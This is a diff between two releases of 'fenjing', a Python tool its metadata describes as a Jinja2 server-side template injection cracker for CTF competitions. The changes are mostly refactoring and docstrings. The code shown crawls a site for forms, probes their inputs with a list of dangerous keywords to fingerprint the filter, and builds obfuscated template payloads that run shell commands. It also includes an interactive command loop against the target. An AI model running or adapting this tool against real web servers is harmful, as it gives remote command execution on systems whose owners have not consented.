# Comparing `tmp/fenjing-0.2.4.tar.gz` & `tmp/fenjing-0.2.5.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "fenjing-0.2.4.tar", last modified: Mon May  8 08:33:45 2023, max compression
+gzip compressed data, was "fenjing-0.2.5.tar", last modified: Tue May  9 10:54:05 2023, max compression
```

## Comparing `fenjing-0.2.4.tar` & `fenjing-0.2.5.tar`

### file list

```diff
@@ -1,26 +1,25 @@
-drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-05-08 08:33:45.884000 fenjing-0.2.4/
--rw-r--r--   0 user      (1000) user      (1000)    16725 2023-05-08 08:15:46.000000 fenjing-0.2.4/LICENSE
--rw-r--r--   0 user      (1000) user      (1000)     4600 2023-05-08 08:33:45.884000 fenjing-0.2.4/PKG-INFO
--rwxr-xr-x   0 user      (1000) user      (1000)     4162 2023-05-08 08:32:55.000000 fenjing-0.2.4/README.md
-drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-05-08 08:33:45.884000 fenjing-0.2.4/fenjing/
--rwxr-xr-x   0 user      (1000) user      (1000)      146 2023-05-08 08:32:55.000000 fenjing-0.2.4/fenjing/__init__.py
--rw-r--r--   0 user      (1000) user      (1000)       60 2023-03-31 08:38:41.000000 fenjing-0.2.4/fenjing/__main__.py
--rw-r--r--   0 user      (1000) user      (1000)     3789 2023-05-08 08:32:55.000000 fenjing-0.2.4/fenjing/cli.py
--rw-r--r--   0 user      (1000) user      (1000)      515 2023-05-08 08:32:55.000000 fenjing-0.2.4/fenjing/colorize.py
--rwxr-x---   0 user      (1000) user      (1000)       36 2023-03-31 08:02:21.000000 fenjing-0.2.4/fenjing/exceptions.py
--rw-r--r--   0 user      (1000) user      (1000)     2030 2023-05-08 08:32:55.000000 fenjing-0.2.4/fenjing/form.py
--rw-r--r--   0 user      (1000) user      (1000)     4709 2023-05-08 08:32:55.000000 fenjing-0.2.4/fenjing/form_cracker.py
--rwxr-xr-x   0 user      (1000) user      (1000)     2832 2023-04-26 05:00:35.000000 fenjing-0.2.4/fenjing/int_vars.py
--rwxr-xr-x   0 user      (1000) user      (1000)    39085 2023-04-26 05:00:35.000000 fenjing-0.2.4/fenjing/pattern.py
--rw-r--r--   0 user      (1000) user      (1000)    27484 2023-05-08 08:32:55.000000 fenjing-0.2.4/fenjing/payload_gen.py
--rw-r--r--   0 user      (1000) user      (1000)     1543 2023-05-08 08:32:55.000000 fenjing-0.2.4/fenjing/requester.py
--rw-r--r--   0 user      (1000) user      (1000)     1066 2023-05-08 08:32:55.000000 fenjing-0.2.4/fenjing/scan_url.py
--rwxr-xr-x   0 user      (1000) user      (1000)     2326 2023-05-08 08:32:55.000000 fenjing-0.2.4/fenjing/shell_payload.py
-drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-05-08 08:33:45.884000 fenjing-0.2.4/fenjing.egg-info/
--rw-r--r--   0 user      (1000) user      (1000)     4600 2023-05-08 08:33:45.000000 fenjing-0.2.4/fenjing.egg-info/PKG-INFO
--rw-r--r--   0 user      (1000) user      (1000)      445 2023-05-08 08:33:45.000000 fenjing-0.2.4/fenjing.egg-info/SOURCES.txt
--rw-r--r--   0 user      (1000) user      (1000)        1 2023-05-08 08:33:45.000000 fenjing-0.2.4/fenjing.egg-info/dependency_links.txt
--rw-r--r--   0 user      (1000) user      (1000)       30 2023-05-08 08:33:45.000000 fenjing-0.2.4/fenjing.egg-info/requires.txt
--rw-r--r--   0 user      (1000) user      (1000)        8 2023-05-08 08:33:45.000000 fenjing-0.2.4/fenjing.egg-info/top_level.txt
--rw-r--r--   0 user      (1000) user      (1000)       38 2023-05-08 08:33:45.884000 fenjing-0.2.4/setup.cfg
--rw-r--r--   0 user      (1000) user      (1000)      860 2023-05-08 04:12:10.000000 fenjing-0.2.4/setup.py
+drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-05-09 10:54:05.403000 fenjing-0.2.5/
+-rw-r--r--   0 user      (1000) user      (1000)    16725 2023-05-08 08:15:46.000000 fenjing-0.2.5/LICENSE
+-rw-r--r--   0 user      (1000) user      (1000)     4552 2023-05-09 10:54:05.402000 fenjing-0.2.5/PKG-INFO
+-rwxr-xr-x   0 user      (1000) user      (1000)     4114 2023-05-08 09:40:28.000000 fenjing-0.2.5/README.md
+drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-05-09 10:54:05.399000 fenjing-0.2.5/fenjing/
+-rwxr-xr-x   0 user      (1000) user      (1000)      159 2023-05-09 09:56:00.000000 fenjing-0.2.5/fenjing/__init__.py
+-rw-r--r--   0 user      (1000) user      (1000)       60 2023-03-31 08:38:41.000000 fenjing-0.2.5/fenjing/__main__.py
+-rw-r--r--   0 user      (1000) user      (1000)     4792 2023-05-09 10:12:57.000000 fenjing-0.2.5/fenjing/cli.py
+-rw-r--r--   0 user      (1000) user      (1000)      799 2023-05-08 09:40:28.000000 fenjing-0.2.5/fenjing/colorize.py
+-rwxr-x---   0 user      (1000) user      (1000)       36 2023-03-31 08:02:21.000000 fenjing-0.2.5/fenjing/exceptions.py
+-rw-r--r--   0 user      (1000) user      (1000)     2654 2023-05-09 09:45:15.000000 fenjing-0.2.5/fenjing/form.py
+-rw-r--r--   0 user      (1000) user      (1000)     6712 2023-05-09 10:12:57.000000 fenjing-0.2.5/fenjing/form_cracker.py
+-rwxr-xr-x   0 user      (1000) user      (1000)     2832 2023-04-26 05:00:35.000000 fenjing-0.2.5/fenjing/int_vars.py
+-rw-r--r--   0 user      (1000) user      (1000)    27557 2023-05-08 09:40:28.000000 fenjing-0.2.5/fenjing/payload_gen.py
+-rw-r--r--   0 user      (1000) user      (1000)     1545 2023-05-08 09:40:28.000000 fenjing-0.2.5/fenjing/requester.py
+-rw-r--r--   0 user      (1000) user      (1000)     1156 2023-05-08 09:40:28.000000 fenjing-0.2.5/fenjing/scan_url.py
+-rwxr-xr-x   0 user      (1000) user      (1000)     2780 2023-05-08 09:40:28.000000 fenjing-0.2.5/fenjing/shell_payload.py
+drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-05-09 10:54:05.402000 fenjing-0.2.5/fenjing.egg-info/
+-rw-r--r--   0 user      (1000) user      (1000)     4552 2023-05-09 10:54:05.000000 fenjing-0.2.5/fenjing.egg-info/PKG-INFO
+-rw-r--r--   0 user      (1000) user      (1000)      426 2023-05-09 10:54:05.000000 fenjing-0.2.5/fenjing.egg-info/SOURCES.txt
+-rw-r--r--   0 user      (1000) user      (1000)        1 2023-05-09 10:54:05.000000 fenjing-0.2.5/fenjing.egg-info/dependency_links.txt
+-rw-r--r--   0 user      (1000) user      (1000)       30 2023-05-09 10:54:05.000000 fenjing-0.2.5/fenjing.egg-info/requires.txt
+-rw-r--r--   0 user      (1000) user      (1000)        8 2023-05-09 10:54:05.000000 fenjing-0.2.5/fenjing.egg-info/top_level.txt
+-rw-r--r--   0 user      (1000) user      (1000)       38 2023-05-09 10:54:05.403000 fenjing-0.2.5/setup.cfg
+-rw-r--r--   0 user      (1000) user      (1000)      860 2023-05-08 04:12:10.000000 fenjing-0.2.5/setup.py
```

### Comparing `fenjing-0.2.4/LICENSE` & `fenjing-0.2.5/LICENSE`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.4/PKG-INFO` & `fenjing-0.2.5/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.2.4
+Version: 0.2.5
 Summary: A Jinja2 SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.9
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
@@ -26,16 +26,14 @@
 在以下方法中选择一种
 
 ### 使用pip安装运行
 
 ```shell
 pip install fenjing
 python -m fenjing scan --url 'http://xxx/'
-# 也可以使用crack功能手动指定form
-# 
 ```
 
 ### 下载并运行docker镜像
 
 ```shell
 docker pull marven11/fenjing
 docker run --net host -it marven11/fenjing scan --url 'http://xxx/'
```

### Comparing `fenjing-0.2.4/README.md` & `fenjing-0.2.5/README.md`

 * *Files 1% similar despite different names*

```diff
@@ -13,16 +13,14 @@
 在以下方法中选择一种
 
 ### 使用pip安装运行
 
 ```shell
 pip install fenjing
 python -m fenjing scan --url 'http://xxx/'
-# 也可以使用crack功能手动指定form
-# 
 ```
 
 ### 下载并运行docker镜像
 
 ```shell
 docker pull marven11/fenjing
 docker run --net host -it marven11/fenjing scan --url 'http://xxx/'
```

### Comparing `fenjing-0.2.4/fenjing/cli.py` & `fenjing-0.2.5/fenjing/cli.py`

 * *Files 18% similar despite different names*

```diff
@@ -1,10 +1,12 @@
 import logging
 from urllib.parse import urlparse
 from traceback import print_exc
+from typing import Callable, List
+from functools import partial
 
 from .form import Form
 from .form_cracker import FormCracker
 from .scan_url import yield_form
 from .requester import Requester, DEFAULT_USER_AGENT
 from .colorize import colored
 import click
@@ -13,23 +15,38 @@
     ____             _ _            
    / __/__  ____    (_|_)___  ____ _
   / /_/ _ \/ __ \  / / / __ \/ __ `/
  / __/  __/ / / / / / / / / / /_/ / 
 /_/  \___/_/ /_/_/ /_/_/ /_/\__, /  
               /___/        /____/   
 """.strip("\n"), bold=True)
+LOGGING_FORMAT = "%(levelname)s:[%(name)s] | %(message)s"
 
 logging.basicConfig(
     level=logging.INFO,
-    format="%(levelname)s:[%(name)s] | %(message)s"
+    format=LOGGING_FORMAT
 )
 logger = logging.getLogger("cli")
 
 
-def interact(cmd_exec):
+def cmd_exec(cmd, cracker: FormCracker, field: str, payload_gen: Callable):
+    payload = payload_gen(cmd)
+    logger.info(f"Submit payload {colored('blue', payload)}")
+    r = cracker.submit(
+        {field: payload})
+    assert r is not None
+    return r.text
+
+
+def interact(cmd_exec: Callable):
+    """根据提供的payload生成方法向用户提供一个交互终端
+
+    Args:
+        cmd_exec (Callable): 根据输入的shell命令生成对应的payload
+    """
     logger.info(f"Use {colored('cran', 'Ctrl+D', bold=True)} to exit.")
     while True:
         try:
             cmd = input("$>> ")
         except EOFError:
             break
         except KeyboardInterrupt:
@@ -50,64 +67,79 @@
 @click.option("--url", "-u", help="form所在的URL")
 @click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
 @click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
 @click.option("--inputs", "-i", help="form的参数，以逗号分隔")
 @click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式")
 @click.option("--interval", default=0.0, help="每次请求的间隔")
 @click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
-def crack(url, action, method, inputs, exec_cmd, interval, user_agent):
+def crack(
+        url: str,
+        action: str,
+        method: str,
+        inputs: str,
+        exec_cmd: str,
+        interval: float,
+        user_agent: str):
+    """
+    攻击指定的表单
+    """
     print(TITLE)
     assert all(param is not None for param in [
                url, inputs]), "Please check your param"
     form = Form(
-        action=action or urlparse(url)[3],
+        action=action or urlparse(url).path,
         method=method,
         inputs=inputs.split(",")
     )
     requester = Requester(interval=interval, user_agent=user_agent)
     cracker = FormCracker(url=url, form=form, requester=requester)
     result = cracker.crack()
     if result is None:
         logger.warning("Test form failed...")
         return
     payload_gen, field = result
-
-    def cmd_exec_func(cmd):
-        r = cracker.submit(
-            {field: payload_gen(cmd)})
-        assert r is not None
-        return r.text
+    cmd_exec_func = partial(cmd_exec, cracker=cracker,
+                            field=field, payload_gen=payload_gen)
+    # def cmd_exec_func(cmd):
+    #     r = cracker.submit(
+    #         {field: payload_gen(cmd)})
+    #     assert r is not None
+    #     return r.text
     if exec_cmd == "":
         interact(cmd_exec_func)
     else:
         print(cmd_exec_func(exec_cmd))
     logger.warning("Bye!")
 
 
 @main.command()
 @click.option("--url", "-u", help="需要扫描的URL")
 @click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则进入交互模式")
 @click.option("--interval", default=0.0, help="每次请求的间隔")
 @click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
 def scan(url, exec_cmd, interval, user_agent):
+    """
+    扫描指定的网站
+    """
     print(TITLE)
     requester = Requester(interval=interval, user_agent=user_agent)
     for page_url, forms in yield_form(requester, url):
         for form in forms:
-            cracker = FormCracker(url=url, form=form, requester=requester)
+            cracker = FormCracker(url=page_url, form=form, requester=requester)
             result = cracker.crack()
             if result is None:
                 continue
             payload_gen, field = result
-
-            def cmd_exec_func(cmd):
-                r = cracker.submit(
-                    {field: payload_gen(cmd)})
-                assert r is not None
-                return r.text
+            cmd_exec_func = partial(cmd_exec, cracker=cracker,
+                                    field=field, payload_gen=payload_gen)
+            # def cmd_exec_func(cmd):
+            #     r = cracker.submit(
+            #         {field: payload_gen(cmd)})
+            #     assert r is not None
+            #     return r.text
             if exec_cmd == "":
                 interact(cmd_exec_func)
             else:
                 print(cmd_exec_func(exec_cmd))
             return
     logger.warning("Scan failed...")
```

### Comparing `fenjing-0.2.4/fenjing/form.py` & `fenjing-0.2.5/fenjing/form.py`

 * *Files 13% similar despite different names*

```diff
@@ -1,45 +1,57 @@
 from urllib.parse import urlparse, urlunparse
 from typing import Iterable
 import random
 import logging
 import string
+from typing import Dict, Any, List
 
 from bs4 import BeautifulSoup
 
 logger = logging.getLogger("utils.form")
 
-def Form(*, action: str, inputs: Iterable, method: str = "POST"):
-    """
-    the form we use
+def Form(*, action: str, inputs: Iterable, method: str = "POST") -> Dict[str, Any]:
+    """根据输入生成一个表单
+
+    Args:
+        action (str): action
+        inputs (Iterable): 所有input
+        method (str, optional): 提交方法. Defaults to "POST".
+
+    Returns:
+        Dict[str, Any]: 表单
     """
     method = method.upper()
     if not action.startswith("/"):
         action = "/" + action
     assert method in ["GET", "POST"]
     return {
         "action": action,
         "method": method,
         "inputs": set(inputs)
     }
 
 
-def parse_forms(url, html):
-    """
-    get forms from a html of a url
+def parse_forms(url, html: str | BeautifulSoup) -> List[dict]:
+    """从html中解析出对应的表单
+
+    Args:
+        url (str): HTML对应的URL
+        html (str | BeautifulSoup): HTML
+
+    Returns:
+        List[dict]: 所有表单
     """
     parsed_url = urlparse(url)
-    uri = parsed_url[3]
+    uri = parsed_url.path
 
     if isinstance(html, str):
         bs = BeautifulSoup(html, "html.parser")
     elif isinstance(html, BeautifulSoup):
         bs = html
-    else:
-        raise NotImplemented(f"Unsupported Type: type(html)={type(html)}")
 
     details = []
     for form_element in bs.select("form"):
         form = Form(
             action=form_element.attrs.get("action", uri),
             method=form_element.attrs.get("method", "POST").upper(),
             inputs=[
@@ -59,16 +71,24 @@
     return {
         k: "".join(random.choices(string.ascii_lowercase, k=8))
         for k in form["inputs"]
     }
 
 
 def fill_form(url, form, form_inputs = None, random_fill_other = True):
-    """
-    fill the form and return keyword arguments for the requests module
+    """根据输入填充表单，返回给requests库的参数
+
+    Args:
+        url (str): 表单所在的URL
+        form (dict): 表单
+        form_inputs (dict, optional): input以及对应的值. Defaults to None.
+        random_fill_other (bool, optional): 是否随机填充其他input. Defaults to True.
+
+    Returns:
+        dict: 给requests的参数
     """
     if random_fill_other:
         fill = random_fill(form)
         if form_inputs is not None:
             fill.update(form_inputs)
     else:
         fill = form_inputs
```

#### encoding

```diff
@@ -1 +1 @@
-us-ascii
+utf-8
```

### Comparing `fenjing-0.2.4/fenjing/form_cracker.py` & `fenjing-0.2.5/fenjing/form_cracker.py`

 * *Files 24% similar despite different names*

```diff
@@ -1,89 +1,142 @@
 from urllib.parse import urlparse
 from collections import Counter, namedtuple
 from functools import lru_cache
 import logging
+from typing import List, Dict, Tuple, Callable, Any
 
-from . import form
+from .form import Form, random_fill, fill_form
 from .requester import Requester
 from .colorize import colored
 from .shell_payload import exec_cmd_payload
 
 
 logger = logging.getLogger("form_cracker")
 Result = namedtuple("Result", "payload_generate_func input_field")
 
 
 class FormCracker:
+    """
+    对指定的文档进行攻击
+    """
     dangerous_keywords = [
         "config", "self", "os", "class", "mro", "base", "request",
         "attr", "open", "system",
         "[", '"', "'", "_", ".", "+", "{{", "|",
         "0", "1", "2",
     ]
     test_cmd = "echo f3n  j1ng;"
     test_result = "f3n j1ng"
 
-    def __init__(self, form, method="POST", inputs=None, url=None, action=None, requester=None, request_interval=0):
+    def __init__(
+            self,
+            form: Dict[str, Any],
+            method: str = "POST",
+            inputs: List[str] | None = None,
+            url: str | None = None,
+            action: str | None = None,
+            requester: Requester | None = None,
+            request_interval: float = 0.0
+    ):
+        """生成用于攻击form的类
+
+        Args:
+            form (dict): 解析后的form元素
+            method (str, optional): form的提交方法. Defaults to "POST".
+            inputs (list, optional): form的输入. Defaults to None.
+            url (str, optional): form所在的url. Defaults to None.
+            action (str, optional): form的action, 为None时和url相同. Defaults to None.
+            requester (Requester, optional): 用于发出请求的requester，为None时自动构造. Defaults to None.
+            request_interval (float, optional): 请求的间隔，用于构造requester. Defaults to 0.
+        """
         self.url = url
         if form:
             self.form = form
         else:
-            assert all(param is not None for param in [method, inputs, url]), \
-                "[method, inputs, url] should not be None!"
-            self.form = form.Form(
+            assert method is not None and inputs is not None and url is not None, \
+                "[method, inputs, url] should not be None!" # for typing
+            self.form = Form(
                 method=method,
                 inputs=inputs,
-                action=action or urlparse(url)[2]
+                action=action or urlparse(url).path
             )
         if requester:
             self.req = requester
         else:
             self.req = Requester(
                 interval=request_interval
             )
 
-    def vulunable_inputs(self):
-        fill_dict = form.random_fill(self.form)
+    def vulunable_inputs(self) -> List[str]:
+        """解析出form中有回显的input
+
+        Returns:
+            List[str]: 所有有回显的input name
+        """
+        fill_dict = random_fill(self.form)
         r = self.req.request(
-            **form.fill_form(
+            **fill_form(
                 self.url,
                 self.form,
                 form_inputs=fill_dict))
         assert r is not None
         return [
             k for k, v in fill_dict.items()
             if v in r.text
         ]
 
     def submit(self, inputs: dict):
-        # logger.info(f"submit {inputs}")
+        """根据inputs提交form
+
+        Args:
+            inputs (dict): 需要提交的input
+
+        Returns:
+            requests.Response: 返回的reponse元素
+        """
         all_length = sum(len(v) for v in inputs.values())
         if all_length > 2048 and self.form["method"] == "GET":
             logger.warning(
                 f"inputs are extremely long (len={all_length}) that the request might fail")
         return self.req.request(
-            **form.fill_form(self.url, self.form, inputs))
+            **fill_form(self.url, self.form, inputs))
 
     def waf_page_hash(self, input_field: str):
+        """使用危险的payload测试对应的input，得到一系列响应后，求出响应中最常见的几个hash
+
+        Args:
+            input_field (str): 需要测试的input
+
+        Returns:
+            List[int]: payload被waf后页面对应的hash
+        """
         resps = {}
         for keyword in self.dangerous_keywords:
-            logger.info(f"Testing dangerous keyword {colored('yellow', repr(keyword * 3))}")
+            logger.info(
+                f"Testing dangerous keyword {colored('yellow', repr(keyword * 3))}")
             resps[keyword] = self.submit({input_field: keyword * 3})
         # resps = {
         #     keyword: self.submit({input_field: keyword * 3})
         #     for keyword in self.dangerous_keywords
         # }
         hashes = [
-            hash(r.text) for r in resps.values()
-            if r is not None and r.status_code != 500
+            hash(r.text) for keyword, r in resps.items()
+            if r is not None and r.status_code != 500 and keyword not in r.text
         ]
         return [pair[0] for pair in Counter(hashes).most_common(2)]
 
-    def crack_inputs(self, input_field):
+    def crack_inputs(self, input_field: str) -> Result | None:
+        """攻击对应的input
+
+        Args:
+            input_field (str): 需要攻击的input
+
+        Returns:
+            Result | None: 对应的payload生成函数，以及对应的input
+        """
         logger.info(f"Testing {colored('yellow', input_field)}")
 
         waf_hashes = self.waf_page_hash(input_field)
 
         @lru_cache(1000)
         def waf_func(value):
             r = self.submit({input_field: value})
@@ -95,15 +148,16 @@
             return None
         if will_echo:
             logger.info(
                 f"Input {colored('yellow', repr(input_field))} looks great, testing generated payload.")
             r = self.submit({input_field: payload})
             assert r is not None
             if self.test_result in r.text:
-                logger.info(f"{colored('green', 'Success!')} Now we can generate payloads.")
+                logger.info(
+                    f"{colored('green', 'Success!')} Now we can generate payloads.")
             else:
                 logger.info(
                     f"{colored('yellow', 'Test Payload Failed', bold=True)}! Generated payloads might be useless.")
             return Result(
                 payload_generate_func=(
                     lambda cmd: exec_cmd_payload(waf_func, cmd)[0]),
                 input_field=input_field
@@ -114,18 +168,24 @@
                 "You can try generating payloads anyway.")
             return Result(
                 payload_generate_func=(
                     lambda cmd: exec_cmd_payload(waf_func, cmd)[0]),
                 input_field=input_field
             )
 
-    def crack(self):
+    def crack(self) -> Result | None:
+        """攻击表单
+
+        Returns:
+            Result | None: 对应的payload生成函数，以及对应的input
+        """
         logger.info(f"Start cracking {self.form}")
         vulunables = self.vulunable_inputs()
-        logger.info(f"These inputs might be vulunable: {colored('yellow', repr(vulunables))}")
+        logger.info(
+            f"These inputs might be vulunable: {colored('yellow', repr(vulunables))}")
 
         for input_field in vulunables:
             result = self.crack_inputs(input_field)
             if result:
                 return result
         logger.warning(f"Failed...")
         return None
```

#### encoding

```diff
@@ -1 +1 @@
-us-ascii
+utf-8
```

### Comparing `fenjing-0.2.4/fenjing/int_vars.py` & `fenjing-0.2.5/fenjing/int_vars.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.4/fenjing/payload_gen.py` & `fenjing-0.2.5/fenjing/payload_gen.py`

 * *Files 0% similar despite different names*

```diff
@@ -1,9 +1,9 @@
 from collections import defaultdict
-from typing import Callable
+from typing import Callable, DefaultDict, List, Dict
 import re
 import time
 import logging
 from .colorize import colored
 
 
 LITERAL = "literal"
@@ -26,28 +26,28 @@
 EVAL_FUNC = "eval_func"
 EVAL = "eval"
 CONFIG = "config"
 MODULE_OS = "module_os"
 OS_POPEN_OBJ = "os_popen_obj"
 OS_POPEN_READ = "os_popen_read"
 
-req_gens = defaultdict(list)
+req_gens: DefaultDict[str, List[Callable]] = defaultdict(list)
 used_count = defaultdict(int)
 logger = logging.getLogger("payload_gen")
 
 def req_gen(f):
     gen_type = re.match("gen_([a-z_]+)_([a-z0-9]+)", f.__name__)
     if not gen_type:
         raise Exception(
             f"Error found when register payload generator {f.__name__}")
     req_gens[gen_type.group(1)].append(f)
 
 
 class PayloadGenerator:
-    def __init__(self, waf_func, context):
+    def __init__(self, waf_func: Callable, context: Dict | None):
         self.waf_func = waf_func
         self.context = context
         self.cache = {}
         self.generate_funcs = {
             LITERAL: self.literal_generate,
             UNSATISFIED: self.unsatisfied_generate
         }
@@ -85,15 +85,15 @@
             # hash() might fail
             if (gen_type, *args) not in self.cache:
                 return None
             return self.cache[(gen_type, *args)]
         except Exception:
             return None
 
-    def default_generate(self, gen_type, *args):
+    def default_generate(self, gen_type: str, *args):
 
         if self.cached_generate(gen_type, *args):
             return self.cached_generate(gen_type, *args)
 
         if gen_type not in req_gens:
             raise Exception(f"Required type '{gen_type}' not supported.")
 
@@ -134,15 +134,15 @@
         self.add_cache(gen_type, *args, result=None)
         return None
 
     def generate(self, gen_type, *args):
         generate_func = self.generate_funcs[gen_type] if gen_type in self.generate_funcs else self.default_generate
         return generate_func(gen_type, *args)
 
-def generate(gen_type, *args, waf_func: Callable | None = None, context: dict | None = None) -> str | None:
+def generate(gen_type, *args, waf_func: Callable, context: dict | None = None) -> str | None:
     payload_generator = PayloadGenerator(waf_func, context)
     return payload_generator.generate(gen_type, *args)
 
 # def generate(gen_type, *args, waf_func: Callable | None = None, context: dict | None = None, cache: dict | None = None) -> str | None:
 
 #     if waf_func is None:
 #         raise Exception("waf_func cannot be None")
```

### Comparing `fenjing-0.2.4/fenjing/requester.py` & `fenjing-0.2.5/fenjing/requester.py`

 * *Files 0% similar despite different names*

```diff
@@ -5,15 +5,15 @@
 
 logger = logging.getLogger("requester")
 DEFAULT_USER_AGENT = "Fenjing/0.1"
 
 class Requester:
     def __init__(
         self,
-        interval=0,
+        interval=0.0,
         timeout=10,
         retry_times=5,
         retry_interval=1,
         retry_status=(429, ),
         user_agent=DEFAULT_USER_AGENT
     ):
         self.interval = interval
```

### Comparing `fenjing-0.2.4/fenjing/scan_url.py` & `fenjing-0.2.5/fenjing/scan_url.py`

 * *Files 27% similar despite different names*

```diff
@@ -4,21 +4,27 @@
 from .form import parse_forms
 
 from bs4 import BeautifulSoup
 
 logger = logging.getLogger("scan_url")
 
 
-def parse_urls(html):
+def parse_urls(html: str | BeautifulSoup) -> list:
+    """从html中解析出所有的链接
+
+    Args:
+        html (str|BeautifulSoup): HTML
+
+    Returns:
+        List[str]: 所有链接
+    """
     if isinstance(html, str):
         bs = BeautifulSoup(html, "html.parser")
     elif isinstance(html, BeautifulSoup):
         bs = html
-    else:
-        raise NotImplemented(f"Unsupported Type: type(html)={type(html)}")
 
     return [element.attrs["href"] for element in bs.select("a") if "href" in element]
 
 
 def yield_form(requester, start_url):
     found = False
     targets = [start_url, ]
```

#### encoding

```diff
@@ -1 +1 @@
-us-ascii
+utf-8
```

### Comparing `fenjing-0.2.4/fenjing/shell_payload.py` & `fenjing-0.2.5/fenjing/shell_payload.py`

 * *Files 9% similar despite different names*

```diff
@@ -1,11 +1,12 @@
+from typing import Callable, List, Tuple
+import logging
+
 from . import payload_gen
 from .int_vars import get_useable_int_vars
-
-import logging
 from .colorize import colored
 
 logger = logging.getLogger("shell_payload")
 
 
 def get_int_context(waf_func):
     ints, var_names, payload = get_useable_int_vars(waf_func)
@@ -22,16 +23,24 @@
          "|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))%}")
     ]
     str_vars = [tpl for tpl in str_vars if waf_func(tpl[2])]
     return "".join(payload for _, _, payload in str_vars), {var_name: var_value for var_name, var_value, _ in str_vars}
 
 
 
-def exec_cmd_payload(waf_func, cmd):
+def exec_cmd_payload(waf_func: Callable[[str, ], bool], cmd: str) -> Tuple[str|None, bool|None]:
+    """根据提供的waf函数为一个shell命令生成对应的payload
 
+    Args:
+        waf_func (Callable[[str, ], bool]): waf函数，判断提供的payload能否通过waf, 能则返回True
+        cmd (str): 需要执行的shell命令
+
+    Returns:
+        Tuple[str|None, bool|None]: 对应的payload, 以及payload是否能生成回显
+    """
     int_payload, int_context = get_int_context(waf_func)
     str_payload, str_context = get_str_context(waf_func)
     before_payload, context = int_payload + str_payload, {**int_context, **str_context}
     outer_payloads = [
         ("{{}}", "{{PAYLOAD}}", True),
         ("{%print()%}", "{%print(PAYLOAD)%}", True),
         ("{%if()%}{%endif%}", "{%if(PAYLOAD)%}{%endif%}", False),
```

#### encoding

```diff
@@ -1 +1 @@
-us-ascii
+utf-8
```

### Comparing `fenjing-0.2.4/fenjing.egg-info/PKG-INFO` & `fenjing-0.2.5/fenjing.egg-info/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.2.4
+Version: 0.2.5
 Summary: A Jinja2 SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.9
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
@@ -26,16 +26,14 @@
 在以下方法中选择一种
 
 ### 使用pip安装运行
 
 ```shell
 pip install fenjing
 python -m fenjing scan --url 'http://xxx/'
-# 也可以使用crack功能手动指定form
-# 
 ```
 
 ### 下载并运行docker镜像
 
 ```shell
 docker pull marven11/fenjing
 docker run --net host -it marven11/fenjing scan --url 'http://xxx/'
```

### Comparing `fenjing-0.2.4/setup.py` & `fenjing-0.2.5/setup.py`

 * *Files identical despite different names*

